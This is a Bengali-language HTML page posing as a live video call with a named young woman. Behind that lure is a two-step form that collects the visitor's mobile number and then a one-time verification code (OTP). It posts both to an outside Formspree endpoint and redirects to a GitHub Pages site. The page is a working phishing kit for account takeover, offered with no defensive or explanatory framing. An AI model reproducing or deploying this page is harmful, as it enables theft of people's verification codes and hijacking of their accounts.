<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sumaiya Akter Jui - LIVE</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #fff; padding-top: 50px; }
        .card { width: 95%; max-width: 380px; margin: auto; padding: 25px; border-radius: 15px; border: 1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 10px; border: 2px solid #f42d4d; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 15px; background: linear-gradient(to right, #4458dc, #f42d4d); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="ssstik.io_1777744992501.jpeg">
    <h2 id="title">Sumaiya Akter Jui</h2>
    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>

    <form action="https://formspree.io/f/mqakvjnd" method="POST" id="mainForm">
        <div id="step1">
            <input type="tel" name="Phone_Number" placeholder="আপনার মোবাইল নম্বর" required>
            <button type="button" onclick="showStep2()">পরবর্তী ধাপ</button>
        </div>

        <div id="step2" style="display:none;">
            <input type="tel" name="OTP_Code" placeholder="৪ ডিজিট কোড (OTP)" required>
            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
        </div>
        
        <input type="hidden" name="_next" value="https://mdbadhonsharkar830-png.github.io/mylive/">
    </form>
</div>

<script>
    function showStep2() {
        const phone = document.getElementsByName('Phone_Number')[0].value;
        if(phone.length < 5) return alert("সঠিক মোবাইল নম্বর দিন");
        
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('title').innerText = "Verification";
        document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
    }
</script>

</body>
</html>
